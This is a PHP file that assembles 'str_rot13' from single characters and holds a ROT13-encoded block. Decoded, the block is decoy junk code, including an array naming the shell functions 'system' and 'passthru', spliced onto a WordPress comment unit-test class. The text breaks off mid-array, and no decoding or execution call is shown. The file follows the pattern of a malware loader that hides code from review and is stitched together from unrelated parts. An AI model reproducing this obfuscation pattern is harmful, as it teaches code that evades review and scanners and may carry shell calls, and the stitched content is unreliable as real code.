<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc pbzzrag
 */
pynff Grfgf_Pbzzrag rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq fgngvp $hfre_vq;
	cebgrpgrq fgngvp $cbfg_vq;
	cebgrpgrq fgngvp $abgvsl_zrffntr = '';

	cebgrpgrq $cercebprff_pbzzrag_qngn = neenl();

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		erfrg_cucznvyre_vafgnapr();
	}

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$hfre_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'       => 'nhgube',
				'hfre_ybtva' => 'grfg_jc_hfre_trg',
				'hfre_cnff'  => 'cnffjbeq',
				'hfre_rznvy' => 'nhgube@rknzcyr.pbz',
			)
		);

		frys::$cbfg_vq = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => frys::$hfre_vq,
			)
		);
	}

	/**
	 * @pbiref ::jc_hcqngr_pbzzrag
	 */
	choyvp shapgvba grfg_jc_hcqngr_pbzzrag() {
		$cbfg  = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'fbzr-cbfg',
				'cbfg_glcr'  => 'cbfg',
			)
		);
		$cbfg2 = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'fbzr-cbfg-2',
				'cbfg_glcr'  => 'cbfg',
			)
		);

		$pbzzragf = frys::snpgbel()->pbzzrag->perngr_cbfg_pbzzragf( $cbfg->VQ, 5 );

		$erfhyg = jc_hcqngr_pbzzrag(
			neenl(
				'pbzzrag_VQ'     => $pbzzragf[0],
				'pbzzrag_cnerag' => $pbzzragf[1],
			)
		);
		$guvf->nffregFnzr( 1, $erfhyg );

		$pbzzrag = trg_pbzzrag( $pbzzragf[0] );
		/*
		 * ::perngr_cbfg_pbzzragf() ergheaf pbzzrag VQf nf vagrtref,
		 * ohg JC_Pbzzrag::$pbzzrag_cnerag vf n fgevat.
		 */
		$guvf->nffregFnzr( (fgevat) $pbzzragf[1], $pbzzrag->pbzzrag_cnerag );

		$erfhyg = jc_hcqngr_pbzzrag(
			neenl(
				'pbzzrag_VQ'     => $pbzzragf[0],
				'pbzzrag_cnerag' => $pbzzragf[1],
			)
		);
		$guvf->nffregFnzr( 0, $erfhyg );

		$erfhyg = jc_hcqngr_pbzzrag(
			neenl(
				'pbzzrag_VQ'      => $pbzzragf[0],
				'pbzzrag_cbfg_VQ' => $cbfg2->VQ,
			)
		);

		$pbzzrag = trg_pbzzrag( $pbzzragf[0] );
		// JC_Cbfg::$VQ vf na vagrtre, ohg JC_Pbzzrag::$pbzzrag_cbfg_VQ vf n fgevat.
		$guvf->nffregFnzr( (fgevat) $cbfg2->VQ, $pbzzrag->pbzzrag_cbfg_VQ );
	}

	choyvp shapgvba grfg_hcqngr_pbzzrag_sebz_cevivyrtrq_hfre_ol_cevivyrtrq_hfre() {
		$nqzva_vq_1 = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
		jc_frg_pheerag_hfre( $nqzva_vq_1 );

		$pbzzrag_vq = jc_arj_pbzzrag(
			neenl(
				'pbzzrag_cbfg_VQ'      => frys::$cbfg_vq,
				'pbzzrag_nhgube'       => 'Nhgube',
				'pbzzrag_nhgube_hey'   => 'uggc://rknzcyr.ybpnyubfg/',
				'pbzzrag_nhgube_rznvy' => 'nhgube@rknzcyr.pbz',
				'hfre_vq'              => $nqzva_vq_1,
				'pbzzrag_pbagrag'      => 'Guvf vf n pbzzrag',
			)
		);

		jc_frg_pheerag_hfre( 0 );

		$nqzva_vq_2 = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr'       => 'nqzvavfgengbe',
				'hfre_ybtva' => 'grfg_jc_nqzva_trg',
				'hfre_cnff'  => 'cnffjbeq',
				'hfre_rznvy' => 'grfgnqzva@rknzcyr.pbz',
			)
		);

		jc_frg_pheerag_hfre( $nqzva_vq_2 );

		jc_hcqngr_pbzzrag(
			neenl(
				'pbzzrag_VQ'      => $pbzzrag_vq,
				'pbzzrag_pbagrag' => 'arj pbzzrag <vzt bareebe=qrzb fep=k>',
			)
		);

		jc_frg_pheerag_hfre( 0 );

		$pbzzrag          = trg_pbzzrag( $pbzzrag_vq );
		$rkcrpgrq_pbagrag = vf_zhygvfvgr()
			? 'arj pbzzrag '
			: 'arj pbzzrag <vzt bareebe=qrzb fep=k>';

		$guvf->nffregFnzr( $rkcrpgrq_pbagrag, $pbzzrag->pbzzrag_pbagrag );
	}

	choyvp shapgvba grfg_hcqngr_pbzzrag_sebz_hacevivyrtrq_hfre_ol_cevivyrtrq_hfre() {
		jc_frg_pheerag_hfre( frys::$hfre_vq );

		$pbzzrag_vq = jc_arj_pbzzrag(
			neenl(
				'pbzzrag_cbfg_VQ'      => frys::$cbfg_vq,
				'pbzzrag_nhgube'       => 'Nhgube',
				'pbzzrag_nhgube_hey'   => 'uggc://rknzcyr.ybpnyubfg/',
				'pbzzrag_nhgube_rznvy' => 'nhgube@rknzcyr.pbz',
				'hfre_vq'              => frys::$hfre_vq,
				'pbzzrag_pbagrag'      => '<n uers=\"uggc://rknzcyr.ybpnyubfg/fbzrguvat.ugzy\">pyvpx</n>',
			)
		);

		jc_frg_pheerag_hfre( 0 );

		$nqzva_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr'       => 'nqzvavfgengbe',
				'hfre_ybtva' => 'grfg_jc_nqzva_trg',
				'hfre_cnff'  => 'cnffjbeq',
				'hfre_rznvy' => 'grfgnqzva@rknzcyr.pbz',
			)
		);

		jc_frg_pheerag_hfre( $nqzva_vq );

		jc_hcqngr_pbzzrag(
			neenl(
				'pbzzrag_VQ'      => $pbzzrag_vq,
				'pbzzrag_pbagrag' => '<n uers=\"uggc://rknzcyr.ybpnyubfg/fbzrguvat.ugzy\" qvfnyybjrq=nggevohgr>pyvpx</n>',
			)
		);

		jc_frg_pheerag_hfre( 0 );

		$pbzzrag = trg_pbzzrag( $pbzzrag_vq );
		$guvf->nffregFnzr( '<n uers=\"uggc://rknzcyr.ybpnyubfg/fbzrguvat.ugzy\" ery=\"absbyybj htp\">pyvpx</n>', $pbzzrag->pbzzrag_pbagrag, 'Pbzzrag: ' . $pbzzrag->pbzzrag_pbagrag );
	}

	/**
	 * @gvpxrg 30627
	 *
	 * @pbiref ::jc_hcqngr_pbzzrag
	 */
	choyvp shapgvba grfg_jc_hcqngr_pbzzrag_hcqngrf_pbzzrag_glcr() {
		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr( neenl( 'pbzzrag_cbfg_VQ' => frys::$cbfg_vq ) );

		jc_hcqngr_pbzzrag(
			neenl(
				'pbzzrag_VQ'   => $pbzzrag_vq,
				'pbzzrag_glcr' => 'cvatonpx',
			)
		);

		$pbzzrag = trg_pbzzrag( $pbzzrag_vq );
		$guvf->nffregFnzr( 'cvatonpx', $pbzzrag->pbzzrag_glcr );
	}

	/**
	 * @gvpxrg 36784
	 *
	 * @pbiref ::jc_hcqngr_pbzzrag
	 */
	choyvp shapgvba grfg_jc_hcqngr_pbzzrag_hcqngrf_pbzzrag_zrgn() {
		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr( neenl( 'pbzzrag_cbfg_VQ' => frys::$cbfg_vq ) );

		jc_hcqngr_pbzzrag(
			neenl(
				'pbzzrag_VQ'   => $pbzzrag_vq,
				'pbzzrag_zrgn' => neenl(
					'sbbq'  => 'gnpb',
					'fnhpr' => 'sver',
				),
			)
		);

		$guvf->nffregFnzr( 'sver', trg_pbzzrag_zrgn( $pbzzrag_vq, 'fnhpr', gehr ) );
	}

	/**
	 * @gvpxrg 30307
	 *
	 * @pbiref ::jc_hcqngr_pbzzrag
	 */
	choyvp shapgvba grfg_jc_hcqngr_pbzzrag_hcqngrf_hfre_vq() {
		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr( neenl( 'pbzzrag_cbfg_VQ' => frys::$cbfg_vq ) );

		jc_hcqngr_pbzzrag(
			neenl(
				'pbzzrag_VQ' => $pbzzrag_vq,
				'hfre_vq'    => 1,
			)
		);

		$pbzzrag = trg_pbzzrag( $pbzzrag_vq );
		$guvf->nffregFnzr( '1', $pbzzrag->hfre_vq );
	}

	/**
	 * @gvpxrg 34954
	 *
	 * @pbiref ::jc_hcqngr_pbzzrag
	 */
	choyvp shapgvba grfg_jc_hcqngr_pbzzrag_jvgu_ab_cbfg_vq() {
		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr( neenl( 'pbzzrag_cbfg_VQ' => 0 ) );

		$hcqngrq_pbzzrag_grkg = 'V fubhyq or noyr gb hcqngr n pbzzrag jvgu n Cbfg VQ bs mreb';

		$hcqngr = jc_hcqngr_pbzzrag(
			neenl(
				'pbzzrag_VQ'      => $pbzzrag_vq,
				'pbzzrag_pbagrag' => $hcqngrq_pbzzrag_grkg,
				'pbzzrag_cbfg_VQ' => 0,
			)
		);
		$guvf->nffregFnzr( 1, $hcqngr );

		$pbzzrag = trg_pbzzrag( $pbzzrag_vq );
		$guvf->nffregFnzr( $hcqngrq_pbzzrag_grkg, $pbzzrag->pbzzrag_pbagrag );
	}

	/**
	 * @gvpxrg 39732
	 *
	 * @pbiref ::jc_hcqngr_pbzzrag
	 */
	choyvp shapgvba grfg_jc_hcqngr_pbzzrag_ergheaf_snyfr_sbe_vainyvq_pbzzrag_be_cbfg_vq() {
		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr( neenl( 'pbzzrag_cbfg_VQ' => frys::$cbfg_vq ) );

		$hcqngr = jc_hcqngr_pbzzrag(
			neenl(
				'pbzzrag_VQ'      => -1,
				'pbzzrag_cbfg_VQ' => frys::$cbfg_vq,
			)
		);
		$guvf->nffregSnyfr( $hcqngr );

		$hcqngr = jc_hcqngr_pbzzrag(
			neenl(
				'pbzzrag_VQ'      => $pbzzrag_vq,
				'pbzzrag_cbfg_VQ' => -1,
			)
		);
		$guvf->nffregSnyfr( $hcqngr );
	}

	/**
	 * @gvpxrg 39732
	 *
	 * @pbiref ::jc_hcqngr_pbzzrag
	 */
	choyvp shapgvba grfg_jc_hcqngr_pbzzrag_vf_jc_reebe() {
		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr( neenl( 'pbzzrag_cbfg_VQ' => frys::$cbfg_vq ) );

		nqq_svygre( 'jc_hcqngr_pbzzrag_qngn', neenl( $guvf, 'jc_hcqngr_pbzzrag_qngn_svygre' ), 10, 3 );

		$erfhyg = jc_hcqngr_pbzzrag(
			neenl(
				'pbzzrag_VQ'   => $pbzzrag_vq,
				'pbzzrag_glcr' => 'cvatonpx',
			),
			gehr
		);

		erzbir_svygre( 'jc_hcqngr_pbzzrag_qngn', neenl( $guvf, 'jc_hcqngr_pbzzrag_qngn_svygre' ), 10, 3 );

		$guvf->nffregJCReebe( $erfhyg );
	}

	/**
	 * Oybpxf pbzzragf sebz orvat hcqngrq ol ergheavat JC_Reebe.
	 */
	choyvp shapgvba jc_hcqngr_pbzzrag_qngn_svygre( $qngn, $pbzzrag, $pbzzragnee ) {
		erghea arj JC_Reebe( 'pbzzrag_jebat', 'jc_hcqngr_pbzzrag_qngn svygre snvyf sbe guvf pbzzrag.', 500 );
	}

	/**
	 * @pbiref ::trg_nccebirq_pbzzragf
	 */
	choyvp shapgvba grfg_trg_nccebirq_pbzzragf() {
		$pn1 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_nccebirq' => '1',
			)
		);
		$pn2 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_nccebirq' => '1',
			)
		);
		$pn3 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_nccebirq' => '0',
			)
		);
		$p2  = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_nccebirq' => '1',
				'pbzzrag_glcr'     => 'cvatonpx',
			)
		);
		$p3  = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_nccebirq' => '1',
				'pbzzrag_glcr'     => 'genpxonpx',
			)
		);
		$p4  = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_nccebirq' => '1',
				'pbzzrag_glcr'     => 'znevb',
			)
		);
		$p5  = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_nccebirq' => '1',
				'pbzzrag_glcr'     => 'yhvtv',
			)
		);

		$sbhaq = trg_nccebirq_pbzzragf( frys::$cbfg_vq );

		// Nyy pbzzrag glcrf jvyy or erghearq.
		$guvf->nffregRdhnyf( neenl( $pn1, $pn2, $p2, $p3, $p4, $p5 ), jc_yvfg_cyhpx( $sbhaq, 'pbzzrag_VQ' ) );
	}

	/**
	 * @gvpxrg 30412
	 *
	 * @pbiref ::trg_nccebirq_pbzzragf
	 */
	choyvp shapgvba grfg_trg_nccebirq_pbzzragf_jvgu_cbfg_vq_0_fubhyq_erghea_rzcgl_neenl() {
		$pn1 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'pbzzrag_nccebirq' => '1',
			)
		);

		$sbhaq = trg_nccebirq_pbzzragf( 0 );

		$guvf->nffregFnzr( neenl(), $sbhaq );
	}

	/**
	 * Grfgf gung trg_pnapry_pbzzrag_ercyl_yvax() ergheaf gur rkcrpgrq inyhr.
	 *
	 * @gvpxrg 53962
	 *
	 * @qngnCebivqre qngn_trg_pnapry_pbzzrag_ercyl_yvax
	 *
	 * @pbiref ::trg_pnapry_pbzzrag_ercyl_yvax
	 *
	 * @cnenz fgevat        $grkg       Grkg gb qvfcynl sbe pnapry ercyl yvax.
	 *                                  Vs rzcgl, qrsnhygf gb 'Pyvpx urer gb pnapry ercyl'.
	 * @cnenz fgevat|vag    $cbfg       Gur cbfg gur pbzzrag guernq vf orvat qvfcynlrq sbe.
	 *                                  Npprcgf 'CBFG_VQ', 'CBFG', be na vagrtre cbfg VQ.
	 * @cnenz vag|obby|ahyy $ercylgbpbz N pbzzrag VQ (vag), jurgure gb trarengr na nccebirq (gehr) be hanccebirq (snyfr) pbzzrag,
	 *                                  be ahyy abg gb perngr n pbzzrag.
	 * @cnenz fgevat        $rkcrpgrq   Gur rkcrpgrq ercyl yvax.
	 */
	choyvp shapgvba grfg_trg_pnapry_pbzzrag_ercyl_yvax( $grkg, $cbfg, $ercylgbpbz, $rkcrpgrq ) {
		vs ( 'CBFG_VQ' === $cbfg ) {
			$cbfg = frys::$cbfg_vq;
		} ryfrvs ( 'CBFG' === $cbfg ) {
			$cbfg = frys::snpgbel()->cbfg->trg_bowrpg_ol_vq( frys::$cbfg_vq );
		}

		vs ( ahyy === $ercylgbpbz ) {
			hafrg( $_TRG['ercylgbpbz'] );
		} ryfr {
			$_TRG['ercylgbpbz'] = $guvf->perngr_pbzzrag_jvgu_nccebiny_fgnghf( $ercylgbpbz );
		}

		$guvf->nffregFnzr( $rkcrpgrq, trg_pnapry_pbzzrag_ercyl_yvax( $grkg, $cbfg ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_trg_pnapry_pbzzrag_ercyl_yvax() {
		erghea neenl(
			'grkg nf rzcgl fgevat, n inyvq cbfg VQ naq na nccebirq pbzzrag'    => neenl(
				'grkg'       => '',
				'cbfg'       => 'CBFG_VQ',
				'ercylgbpbz' => gehr,
				'rkcrpgrq'   => '<n ery=\"absbyybj\" vq=\"pnapry-pbzzrag-ercyl-yvax\" uers=\"#erfcbaq\">Pyvpx urer gb pnapry ercyl.</n>',
			),
			'grkg nf n phfgbz fgevat, n inyvq cbfg VQ naq na nccebirq pbzzrag' => neenl(
				'grkg'       => 'Yrnir n ercyl!',
				'cbfg'       => 'CBFG_VQ',
				'ercylgbpbz' => gehr,
				'rkcrpgrq'   => '<n ery=\"absbyybj\" vq=\"pnapry-pbzzrag-ercyl-yvax\" uers=\"#erfcbaq\">Yrnir n ercyl!</n>',
			),
			'grkg nf rzcgl fgevat, n inyvq JC_Cbfg bowrpg naq na nccebirq pbzzrag' => neenl(
				'grkg'       => '',
				'cbfg'       => 'CBFG',
				'ercylgbpbz' => gehr,
				'rkcrpgrq'   => '<n ery=\"absbyybj\" vq=\"pnapry-pbzzrag-ercyl-yvax\" uers=\"#erfcbaq\">Pyvpx urer gb pnapry ercyl.</n>',
			),
			'grkg nf n phfgbz fgevat, n inyvq JC_Cbfg bowrpg naq na nccebirq pbzzrag' => neenl(
				'grkg'       => 'Yrnir n ercyl!',
				'cbfg'       => 'CBFG',
				'ercylgbpbz' => gehr,
				'rkcrpgrq'   => '<n ery=\"absbyybj\" vq=\"pnapry-pbzzrag-ercyl-yvax\" uers=\"#erfcbaq\">Yrnir n ercyl!</n>',
			),
			'grkg nf rzcgl fgevat, na vainyvq cbfg naq na nccebirq pbzzrag'    => neenl(
				'grkg'       => '',
				'cbfg'       => -99999,
				'ercylgbpbz' => gehr,
				'rkcrpgrq'   => '<n ery=\"absbyybj\" vq=\"pnapry-pbzzrag-ercyl-yvax\" uers=\"#erfcbaq\" fglyr=\"qvfcynl:abar;\">Pyvpx urer gb pnapry ercyl.</n>',
			),
			'grkg nf n phfgbz fgevat, n inyvq cbfg, ohg ab ercylgbpbz' => neenl(
				'grkg'       => 'Yrnir n ercyl!',
				'cbfg'       => 'CBFG',
				'ercylgbpbz' => ahyy,
				'rkcrpgrq'   => '<n ery=\"absbyybj\" vq=\"pnapry-pbzzrag-ercyl-yvax\" uers=\"#erfcbaq\" fglyr=\"qvfcynl:abar;\">Yrnir n ercyl!</n>',
			),
		);
	}

	/**
	 * Grfgf gung pbzzrag_sbez_gvgyr() bhgchgf gur nhgube bs na nccebirq pbzzrag.
	 *
	 * @gvpxrg 53962
	 *
	 * @pbiref ::pbzzrag_sbez_gvgyr
	 */
	choyvp shapgvba grfg_fubhyq_bhgchg_gur_nhgube_bs_na_nccebirq_pbzzrag() {
		// Zhfg or frg sbe `pbzzrag_sbez_gvgyr()`.
		$_TRG['ercylgbpbz'] = $guvf->perngr_pbzzrag_jvgu_nccebiny_fgnghf( gehr );

		$pbzzrag = trg_pbzzrag( $_TRG['ercylgbpbz'] );
		pbzzrag_sbez_gvgyr( snyfr, snyfr, snyfr, frys::$cbfg_vq );

		$guvf->nffregVafgnaprBs(
			'JC_Pbzzrag',
			$pbzzrag,
			'Gur pbzzrag vf abg na vafgnapr bs JC_Pbzzrag.'
		);

		$guvf->nffregBowrpgUnfCebcregl(
			'pbzzrag_nhgube',
			$pbzzrag,
			'Gur pbzzrag bowrpg qbrf abg unir n \"pbzzrag_nhgube\" cebcregl.'
		);

		$guvf->nffregVfFgevat(
			$pbzzrag->pbzzrag_nhgube,
			'Gur \"pbzzrag_nhgube\" vf abg n fgevat.'
		);

		$guvf->rkcrpgBhgchgFgevat(
			'Yrnir n Ercyl gb ' . $pbzzrag->pbzzrag_nhgube,
			'Gur rkcrpgrq fgevat jnf abg bhgchg.'
		);
	}

	/**
	 * Grfgf gung trg_pbzzrag_vq_svryqf() nyybjf ercylvat gb na nccebirq pbzzrag.
	 *
	 * @gvpxrg 53962
	 *
	 * @qngnCebivqre qngn_fubhyq_nyybj_ercyl_gb_na_nccebirq_pbzzrag
	 *
	 * @pbiref ::trg_pbzzrag_vq_svryqf
	 *
	 * @cnenz fgevat $pbzzrag_cbfg Gur cbfg bs gur pbzzrag.
	 *                             Npprcgf 'CBFG', 'ARJ_CBFG', 'CBFG_VQ' naq 'ARJ_CBFG_VQ'.
	 */
	choyvp shapgvba grfg_fubhyq_nyybj_ercyl_gb_na_nccebirq_pbzzrag( $pbzzrag_cbfg ) {
		// Zhfg or frg sbe `trg_pbzzrag_vq_svryqf()`.
		$_TRG['ercylgbpbz'] = $guvf->perngr_pbzzrag_jvgu_nccebiny_fgnghf( gehr );

		vs ( 'CBFG_VQ' === $pbzzrag_cbfg ) {
			$pbzzrag_cbfg = frys::$cbfg_vq;
		} ryfrvs ( 'CBFG' === $pbzzrag_cbfg ) {
			$pbzzrag_cbfg = frys::snpgbel()->cbfg->trg_bowrpg_ol_vq( frys::$cbfg_vq );
		}

		$rkcrpgrq  = \"<vachg glcr='uvqqra' anzr='pbzzrag_cbfg_VQ' inyhr='\" . frys::$cbfg_vq . \"' vq='pbzzrag_cbfg_VQ' />\a\";
		$rkcrpgrq .= \"<vachg glcr='uvqqra' anzr='pbzzrag_cnerag' vq='pbzzrag_cnerag' inyhr='\" . $_TRG['ercylgbpbz'] . \"' />\a\";
		$npghny    = trg_pbzzrag_vq_svryqf( $pbzzrag_cbfg );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fubhyq_nyybj_ercyl_gb_na_nccebirq_pbzzrag() {
		erghea neenl(
			'n cbfg VQ'        => neenl( 'pbzzrag_cbfg' => 'CBFG_VQ' ),
			'n JC_Cbfg bowrpg' => neenl( 'pbzzrag_cbfg' => 'CBFG' ),
		);
	}

	/**
	 * Grfgf gung trg_pbzzrag_vq_svryqf() ergheaf na rzcgl fgevat
	 * jura gur cbfg pnaabg or ergevrirq.
	 *
	 * @gvpxrg 53962
	 *
	 * @qngnCebivqre qngn_aba_rkvfgrag_cbfgf
	 *
	 * @pbiref ::trg_pbzzrag_vq_svryqf
	 *
	 * @cnenz obby  $ercylgbpbz   Jurgure gb perngr na nccebirq (gehr) be hanccebirq (snyfr) pbzzrag.
	 * @cnenz vag   $pbzzrag_cbfg Gur cbfg bs gur pbzzrag.
	 *
	 */
	choyvp shapgvba grfg_fubhyq_erghea_rzcgl_fgevat( $ercylgbpbz, $pbzzrag_cbfg ) {
		vs ( vf_obby( $ercylgbpbz ) ) {
			$ercylgbpbz = $guvf->perngr_pbzzrag_jvgu_nccebiny_fgnghf( $ercylgbpbz );
		}

		// Zhfg or frg sbe `trg_pbzzrag_vq_svryqf()`.
		$_TRG['ercylgbpbz'] = $ercylgbpbz;

		$npghny = trg_pbzzrag_vq_svryqf( $pbzzrag_cbfg );

		$guvf->nffregFnzr( '', $npghny );
	}

	/**
	 * Grfgf gung pbzzrag_sbez_gvgyr() qbrf abg bhgchg gur nhgube.
	 *
	 * @gvpxrg 53962
	 *
	 * @pbiref ::pbzzrag_sbez_gvgyr
	 *
	 * @qngnCebivqre qngn_cnerag_pbzzragf
	 * @qngnCebivqre qngn_aba_rkvfgrag_cbfgf
	 *
	 * @cnenz obby   $ercylgbpbz   Jurgure gb perngr na nccebirq (gehr) be hanccebirq (snyfr) pbzzrag.
	 * @cnenz fgevat $pbzzrag_cbfg Gur cbfg bs gur pbzzrag.
	 *                             Npprcgf 'CBFG', 'ARJ_CBFG', 'CBFG_VQ' naq 'ARJ_CBFG_VQ'.
	 */
	choyvp shapgvba grfg_fubhyq_abg_bhgchg_gur_nhgube( $ercylgbpbz, $pbzzrag_cbfg ) {
		vs ( vf_obby( $ercylgbpbz ) ) {
			$ercylgbpbz = $guvf->perngr_pbzzrag_jvgu_nccebiny_fgnghf( $ercylgbpbz );
		}

		// Zhfg or frg sbe `pbzzrag_sbez_gvgyr()`.
		$_TRG['ercylgbpbz'] = $ercylgbpbz;

		vs ( 'ARJ_CBFG_VQ' === $pbzzrag_cbfg ) {
			$pbzzrag_cbfg = frys::snpgbel()->cbfg->perngr();
		} ryfrvs ( 'ARJ_CBFG' === $pbzzrag_cbfg ) {
			$pbzzrag_cbfg = frys::snpgbel()->cbfg->perngr_naq_trg();
		} ryfrvs ( 'CBFG_VQ' === $pbzzrag_cbfg ) {
			$pbzzrag_cbfg = frys::$cbfg_vq;
		} ryfrvs ( 'CBFG' === $pbzzrag_cbfg ) {
			$pbzzrag_cbfg = frys::snpgbel()->cbfg->trg_bowrpg_ol_vq( frys::$cbfg_vq );
		}

		$pbzzrag_cbfg_vq = $pbzzrag_cbfg vafgnaprbs JC_Cbfg ? $pbzzrag_cbfg->VQ : $pbzzrag_cbfg;

		trg_pbzzrag( $_TRG['ercylgbpbz'] );

		pbzzrag_sbez_gvgyr( snyfr, snyfr, snyfr, $pbzzrag_cbfg_vq );

		$guvf->rkcrpgBhgchgFgevat( 'Yrnir n Ercyl' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_aba_rkvfgrag_cbfgf() {
		erghea neenl(
			'na hanccebirq pbzzrag naq n aba-rkvfgrag cbfg VQ' => neenl(
				'ercylgbpbz'   => snyfr,
				'pbzzrag_cbfg' => -99999,
			),
			'na nccebirq pbzzrag naq n aba-rkvfgrag cbfg VQ' => neenl(
				'ercylgbpbz'   => gehr,
				'pbzzrag_cbfg' => -99999,
			),
		);
	}

	/**
	 * Grfgf gung trg_pbzzrag_vq_svryqf() qbrf abg nyybj ercyvrf jura
	 * gur pbzzrag qbrf abg unir n cnerag cbfg.
	 *
	 * @gvpxrg 53962
	 *
	 * @pbiref ::trg_pbzzrag_vq_svryqf
	 *
	 * @qngnCebivqre qngn_cnerag_pbzzragf
	 *
	 * @cnenz zvkrq  $ercylgbpbz   Jurgure gb perngr na nccebirq (gehr) be hanccebirq (snyfr) pbzzrag,
	 *                             be na vainyvq pbzzrag VQ.
	 * @cnenz fgevat $pbzzrag_cbfg Gur cbfg bs gur pbzzrag.
	 *                             Npprcgf 'CBFG', 'ARJ_CBFG', 'CBFG_VQ' naq 'ARJ_CBFG_VQ'.
	 */
	choyvp shapgvba grfg_fubhyq_abg_nyybj_ercyl( $ercylgbpbz, $pbzzrag_cbfg ) {
		vs ( vf_obby( $ercylgbpbz ) ) {
			$ercylgbpbz = $guvf->perngr_pbzzrag_jvgu_nccebiny_fgnghf( $ercylgbpbz );
		}

		// Zhfg or frg sbe `trg_pbzzrag_vq_svryqf()`.
		$_TRG['ercylgbpbz'] = $ercylgbpbz;

		vs ( 'ARJ_CBFG_VQ' === $pbzzrag_cbfg ) {
			$pbzzrag_cbfg = frys::snpgbel()->cbfg->perngr();
		} ryfrvs ( 'ARJ_CBFG' === $pbzzrag_cbfg ) {
			$pbzzrag_cbfg = frys::snpgbel()->cbfg->perngr_naq_trg();
		} ryfrvs ( 'CBFG_VQ' === $pbzzrag_cbfg ) {
			$pbzzrag_cbfg = frys::$cbfg_vq;
		} ryfrvs ( 'CBFG' === $pbzzrag_cbfg ) {
			$pbzzrag_cbfg = frys::snpgbel()->cbfg->trg_bowrpg_ol_vq( frys::$cbfg_vq );
		}

		$pbzzrag_cbfg_vq = $pbzzrag_cbfg vafgnaprbs JC_Cbfg ? $pbzzrag_cbfg->VQ : $pbzzrag_cbfg;

		$rkcrpgrq  = \"<vachg glcr='uvqqra' anzr='pbzzrag_cbfg_VQ' inyhr='\" . $pbzzrag_cbfg_vq . \"' vq='pbzzrag_cbfg_VQ' />\a\";
		$rkcrpgrq .= \"<vachg glcr='uvqqra' anzr='pbzzrag_cnerag' vq='pbzzrag_cnerag' inyhr='0' />\a\";
		$npghny    = trg_pbzzrag_vq_svryqf( $pbzzrag_cbfg );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_cnerag_pbzzragf() {
		erghea neenl(
			'na hanccebirq cnerag pbzzrag (VQ)'      => neenl(
				'ercylgbpbz'   => snyfr,
				'pbzzrag_cbfg' => 'CBFG_VQ',
			),
			'na nccebirq cnerag pbzzrag ba nabgure cbfg (VQ)' => neenl(
				'ercylgbpbz'   => gehr,
				'pbzzrag_cbfg' => 'ARJ_CBFG_VQ',
			),
			'na hanccebirq cnerag pbzzrag ba nabgure cbfg (VQ)' => neenl(
				'ercylgbpbz'   => snyfr,
				'pbzzrag_cbfg' => 'ARJ_CBFG_VQ',
			),
			'n cnerag pbzzrag VQ gung pnaabg or pnfg gb na vagrtre' => neenl(
				'ercylgbpbz'   => neenl( 'V pnaabg or pnfg gb na vagrtre.' ),
				'pbzzrag_cbfg' => 'CBFG_VQ',
			),
			'na hanccebirq cnerag pbzzrag (JC_Cbfg)' => neenl(
				'ercylgbpbz'   => snyfr,
				'pbzzrag_cbfg' => 'CBFG',
			),
			'na nccebirq cnerag pbzzrag ba nabgure cbfg (JC_Cbfg)' => neenl(
				'ercylgbpbz'   => gehr,
				'pbzzrag_cbfg' => 'ARJ_CBFG',
			),
			'na hanccebirq cnerag pbzzrag ba nabgure cbfg (JC_Cbfg)' => neenl(
				'ercylgbpbz'   => snyfr,
				'pbzzrag_cbfg' => 'ARJ_CBFG',
			),
